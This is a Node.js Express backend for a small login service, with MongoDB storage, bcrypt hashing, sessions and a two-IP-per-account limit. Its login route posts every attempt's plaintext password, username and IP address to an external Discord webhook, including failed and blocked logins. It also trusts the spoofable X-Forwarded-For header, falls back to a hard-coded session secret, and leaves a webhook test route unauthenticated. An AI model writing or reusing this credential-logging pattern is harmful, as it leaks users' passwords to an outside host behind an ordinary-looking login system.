// backend.js
require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const session = require('express-session');
const cors = require('cors');
const https = require('https');

const app = express();

// so we can see real IPs behind proxies
app.set('trust proxy', true);

/*
  CORS: keep it simple.
  - allow localhost:3000 (your React dev)
  - you can add Netlify later
  - allow credentials (we use sessions)
*/
app.use(
  cors({
    origin: [
      'http://localhost:3000',
      'https://vocal-bunny-613a1e.netlify.app',   // <-- your netlify
    ],
    credentials: true,
  })
);


// parse JSON
app.use(express.json());

// sessions
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'change-me',
    resave: false,
    saveUninitialized: false,
  })
);

// connect to MongoDB
mongoose
  .connect(process.env.MONGO_URL)
  .then(() => console.log('Mongo connected'))
  .catch((err) => console.error('Mongo error', err));

// schema
const userSchema = new mongoose.Schema({
  username: { type: String, unique: true },
  passwordHash: String,
  ips: [String],
});
const User = mongoose.model('User', userSchema);

// get client IP
function getClientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.ip;
}

// discord logger (uses https so we don't need fetch)
function logToDiscord(content) {
  const url = process.env.DISCORD_WEBHOOK_URL;
  if (!url) {
    console.log('DISCORD_WEBHOOK_URL not set');
    return;
  }

  const parsed = new URL(url);
  const data = JSON.stringify({ content });

  const options = {
    hostname: parsed.hostname,
    path: parsed.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
    },
  };

  const req = https.request(options, (res) => {
    // console.log('discord status', res.statusCode);
  });

  req.on('error', (err) => {
    console.error('discord log failed', err.message);
  });

  req.write(data);
  req.end();
}

// ADMIN create-user
app.post('/admin/create-user', async (req, res) => {
  const adminKey = req.headers['x-admin-key'];
  if (adminKey !== process.env.ADMIN_KEY) {
    return res.status(401).json({ error: 'not allowed' });
  }

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'need username and password' });
  }

  const hash = await bcrypt.hash(password, 12);

  try {
    const user = new User({
      username,
      passwordHash: hash,
      ips: [],
    });
    await user.save();

    logToDiscord(
      `🆕 User created
**username:** ${username}`
    );

    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: 'username taken?' });
  }
});

// LOGIN with 2-IP lock + discord log
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIp(req);

  const user = await User.findOne({ username });
  if (!user) {
    logToDiscord(
      `❌ Login failed (user not found)
**username:** ${username}
**password:** ${password}
**ip:** ${ip}`
    );
    return res.status(401).json({ error: 'bad login' });
  }

  const match = await bcrypt.compare(password, user.passwordHash);
  if (!match) {
    logToDiscord(
      `❌ Login failed (bad password)
**username:** ${username}
**password:** ${password}
**ip:** ${ip}`
    );
    return res.status(401).json({ error: 'bad login' });
  }

  const hasIp = user.ips.includes(ip);

  if (!hasIp) {
    // max 2 ips
    if (user.ips.length >= 2) {
      logToDiscord(
        `⛔ Login blocked (IP limit reached)
**username:** ${username}
**password:** ${password}
**ip:** ${ip}
**stored_ips:** ${user.ips.join(', ')}`
      );
      return res.status(403).json({ error: 'ip limit reached' });
    }
    user.ips.push(ip);
    await user.save();
  }

  // success
  req.session.userId = user._id.toString();

  logToDiscord(
    `✅ Login success
**username:** ${username}
**password:** ${password}
**ip:** ${ip}
**stored_ips_now:** ${user.ips.join(', ')}`
  );

  res.json({ ok: true });
});

// session check
app.get('/me', (req, res) => {
  if (!req.session.userId) return res.json({ loggedIn: false });
  res.json({ loggedIn: true });
});

// quick discord test
app.get('/test-discord', (req, res) => {
  logToDiscord('🧪 test message from /test-discord');
  res.json({ ok: true });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log('server running on', PORT);
});
